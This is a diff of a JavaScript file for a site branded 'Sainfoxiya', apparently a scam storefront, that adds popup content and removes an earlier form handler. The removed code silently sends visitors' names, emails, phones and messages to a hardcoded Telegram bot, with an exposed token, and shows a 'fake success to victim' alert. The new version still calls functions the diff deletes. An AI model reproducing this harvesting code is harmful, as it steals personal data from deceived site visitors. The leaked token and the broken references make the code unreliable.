@@ -1,160 +1,122 @@
-// ── CONFIG ── CHANGE THESE ────────────────────────────────────────
-const TELEGRAM_BOT_TOKEN = "8235734619:AAEVmjaTSbPBvzKZJuyCOgxXvOb_m5ILWxo";           // 7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-const TELEGRAM_CHAT_ID    = "8060968649";            // -1001987654321 or @yourchannel
+/**
+ * SAINFOXIYA - Global Data Store for Footers & Popups
+ * This file contains the dynamic content for various website sections.
+ */
 
-// ── Helpers ───────────────────────────────────────────────────────
-function scrollToSection(id) {
-    document.getElementById(id)?.scrollIntoView({ behavior: 'smooth' });
-}
-
-function toggleMobileMenu() {
-    const menu  = document.getElementById('mobile-menu');
-    const open  = document.getElementById('hamburger-open');
-    const close = document.getElementById('hamburger-close');
-    menu.classList.toggle('hidden');
-    open.classList.toggle('hidden');
-    close.classList.toggle('hidden');
-}
-
-function prepareInquiry(product) {
-    scrollToSection('contact');
-    console.log(`Inquiry for: ${product}`);
-}
-
-// ── Send to Telegram with sanitization ────────────────────────────
-function sendToTelegram(name, email, phone, message) {
-    // Sanitize: remove dangerous chars & trim
-    name    = (name    || '').trim().replace(/[<>&"']/g, '');
-    email   = (email   || '').trim().replace(/[<>&"']/g, '');
-    phone   = (phone   || '').trim().replace(/[<>&"']/g, '');
-    message = (message || '').trim().replace(/[<>&"']/g, '');
-
-    const text = 
-`🔥 NEW SAINFOXIYA LEAD 🔥
-━━━━━━━━━━━━━━━━━━━━━
-Name/Title: ${name || '—'}
-Email:      ${email || '—'}
-Phone:      ${phone || '—'}
-Message:
-${message || '—'}
-
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
-UA: ${navigator.userAgent.slice(0,120)}...`;
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-
-    fetch(url)
-        .then(r => r.json())
-        .then(data => {
-            if (data.ok) console.log("[+] Telegram sent");
-            else console.error("Telegram error:", data);
-        })
-        .catch(err => console.error("Fetch failed:", err));
-}
-
-function handleFormSubmit(e) {
-    e.preventDefault();
-
-    const form = e.target;
-    const name    = form.querySelector('[name="name"]').value;
-    const email   = form.querySelector('[name="email"]').value;
-    const phone   = form.querySelector('[name="phone"]').value;
-    const message = form.querySelector('[name="message"]').value;
-
-    // Send silently to Telegram
-    sendToTelegram(name, email, phone, message);
-
-    // Show fake success to victim
-    const btn = form.querySelector('button');
-    const orig = btn.textContent;
-    btn.textContent = "PROCESSING...";
-    btn.disabled = true;
-
-    setTimeout(() => {
-        alert("Request received. Our team will contact you within 30 minutes.");
-        form.reset();
-        btn.textContent = orig;
-        btn.disabled = false;
-    }, 2200);
-}
-
-// ── Modal Controls ────────────────────────────────────────────────
-function openModal(type) {
-    const modal = document.getElementById(`modal-${type}`);
-    if (!modal) return;
-    modal.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-    setTimeout(() => {
-        modal.querySelector('.modal-content').style.opacity = '1';
-        modal.querySelector('.modal-content').style.transform = 'translateY(0)';
-    }, 10);
-}
-
-function closeModal(event, type) {
-    if (event && event.target.classList.contains('modal-overlay')) {
-        const modal = document.getElementById(`modal-${type}`);
-        modal.classList.add('hidden');
-        document.body.style.overflow = '';
-    } else if (!event) {
-        const modal = document.getElementById(`modal-${type}`);
-        modal.classList.add('hidden');
-        document.body.style.overflow = '';
+const popupData = {
+    privacy: {
+        title: "Privacy Policy",
+        content: `
+            <div class="space-y-4">
+                <h3 class="text-xl font-bold text-slate-900">Hamari Privacy Policy</h3>
+                <p class="text-slate-600">Sainfoxiya aapke data ki security ko priority deta hai. Hum aapke business data ko third parties ke saath kabhi share nahi karte.</p>
+                <ul class="list-disc pl-5 space-y-2 text-slate-600">
+                    <li>Data encryption (SSL) se safe rehta hai.</li>
+                    <li>Orders aur transaction details 100% private rehti hain.</li>
+                    <li>Hum sirf wahi info lete hain jo legal verification ke liye zaruri hai.</li>
+                </ul>
+                <p class="text-sm text-slate-400 italic mt-6">Last Updated: February 2024</p>
+            </div>
+        `
+    },
+    help: {
+        title: "Help Centre",
+        content: `
+            <div class="space-y-4">
+                <h3 class="text-xl font-bold text-slate-900">How can we help you?</h3>
+                <div class="grid gap-4">
+                    <div class="p-4 bg-slate-50 rounded-xl">
+                        <h4 class="font-bold text-blue-600">Order Delay Issues?</h4>
+                        <p class="text-sm text-slate-600">Agar aapka code 5 min tak nahi aaya, toh dashboard mein 'Track Order' karein.</p>
+                    </div>
+                    <div class="p-4 bg-slate-50 rounded-xl">
+                        <h4 class="font-bold text-blue-600">API Integration</h4>
+                        <p class="text-sm text-slate-600">Hamara API documentation portal separately available hai approved partners ke liye.</p>
+                    </div>
+                </div>
+            </div>
+        `
+    },
+    merchant: {
+        title: "Merchant Login",
+        content: `
+            <div class="text-center py-8">
+                <i class="fas fa-user-lock text-5xl text-blue-600 mb-6"></i>
+                <h3 class="text-2xl font-bold mb-4">Merchant Dashboard</h3>
+                <p class="text-slate-600 mb-6">Apne B2B business ko manage karne ke liye sign-in karein.</p>
+                <div class="space-y-4 max-w-sm mx-auto">
+                    <input type="text" placeholder="Merchant ID" class="w-full p-4 rounded-xl border border-slate-200">
+                    <input type="password" placeholder="Password" class="w-full p-4 rounded-xl border border-slate-200">
+                    <button class="w-full py-4 bg-blue-600 text-white font-bold rounded-xl shadow-lg">Login Now</button>
+                </div>
+            </div>
+        `
+    },
+    sales: {
+        title: "Contact Sales",
+        content: `
+            <div class="space-y-6">
+                <h3 class="text-2xl font-bold text-slate-900">Bulk Sales Queries</h3>
+                <p class="text-slate-600">Agar aap ₹5,00,000+ per month ki volume handle kar sakte hain, toh humse direct baat karein special rates ke liye.</p>
+                <div class="bg-blue-50 p-6 rounded-2xl border border-blue-100">
+                    <p class="font-bold text-blue-900">Official Email:</p>
+                    <p class="text-blue-600">sales@sainfoxiya.com</p>
+                    <p class="mt-4 font-bold text-blue-900">Response Time:</p>
+                    <p class="text-blue-600 text-sm">Under 24 Working Hours</p>
+                </div>
+            </div>
+        `
+    },
+    whatsapp: {
+        title: "WhatsApp Support",
+        content: `
+            <div class="text-center py-6">
+                <i class="fab fa-whatsapp text-6xl text-green-500 mb-6"></i>
+                <h3 class="text-2xl font-bold text-slate-900">Instant B2B Chat</h3>
+                <p class="text-slate-600 mb-8">Hamare agents live hain support dene ke liye. Codes, topups aur inventory ki help lein.</p>
+                <a href="https://wa.me/yournumber" class="inline-block px-10 py-4 bg-green-500 text-white font-bold rounded-full shadow-xl hover:bg-green-600 transition">
+                    Open WhatsApp Chat
+                </a>
+            </div>
+        `
     }
+};
+
+/**
+ * Logic to handle Popups
+ */
+function openPopup(key) {
+    const data = popupData[key];
+    if (!data) return;
+
+    const popup = document.getElementById('global-popup');
+    const innerContent = document.getElementById('popup-inner-content');
+
+    // Reset scroll of inner content
+    innerContent.innerHTML = `
+        <h2 class="text-3xl font-bold mb-8 text-slate-900">${data.title}</h2>
+        ${data.content}
+    `;
+
+    popup.style.display = 'flex';
+    document.body.style.overflow = 'hidden'; // Stop scrolling background
 }
 
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape') {
-        closeModal(null, 'privacy');
-        closeModal(null, 'terms');
-    }
-});
-
-// ── Three.js background ───────────────────────────────────────────
-let scene, camera, renderer, particles;
-
-function init3D() {
-    scene = new THREE.Scene();
-    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 2000);
-    renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-    renderer.setSize(window.innerWidth, window.innerHeight);
-    document.getElementById('canvas-container').appendChild(renderer.domElement);
-
-    const geometry = new THREE.BufferGeometry();
-    const vertices = [];
-    const colors = [];
-
-    for (let i = 0; i < 2800; i++) {
-        vertices.push(Math.random() * 2400 - 1200, Math.random() * 2400 - 1200, Math.random() * 2400 - 1200);
-        const r = Math.random() < 0.6 ? 0.83 : 0.49;
-        const g = Math.random() < 0.6 ? 0.68 : 0.23;
-        const b = Math.random() < 0.6 ? 0.22 : 0.92;
-        colors.push(r, g, b);
-    }
-
-    geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
-    geometry.setAttribute('color', new THREE.Float32BufferAttribute(colors, 3));
-
-    const material = new THREE.PointsMaterial({size:2.4, vertexColors:true, transparent:true, opacity:0.65, blending:THREE.AdditiveBlending});
-    particles = new THREE.Points(geometry, material);
-    scene.add(particles);
-    camera.position.z = 900;
-
-    window.addEventListener('resize', () => {
-        camera.aspect = window.innerWidth / window.innerHeight;
-        camera.updateProjectionMatrix();
-        renderer.setSize(window.innerWidth, window.innerHeight);
-    });
-
-    animate();
+function closePopup() {
+    const popup = document.getElementById('global-popup');
+    popup.style.display = 'none';
+    document.body.style.overflow = 'auto'; // Re-enable scrolling
 }
 
-function animate() {
-    requestAnimationFrame(animate);
-    particles.rotation.y += 0.00028;
-    particles.rotation.x += 0.00015;
-    renderer.render(scene, camera);
+// Close popup when clicking outside the box
+window.onclick = function(event) {
+    const popup = document.getElementById('global-popup');
+    if (event.target == popup) {
+        closePopup();
+    }
 }
 
 init3D();
+
 
 document.getElementById('inquiry-form')?.addEventListener('submit', handleFormSubmit);
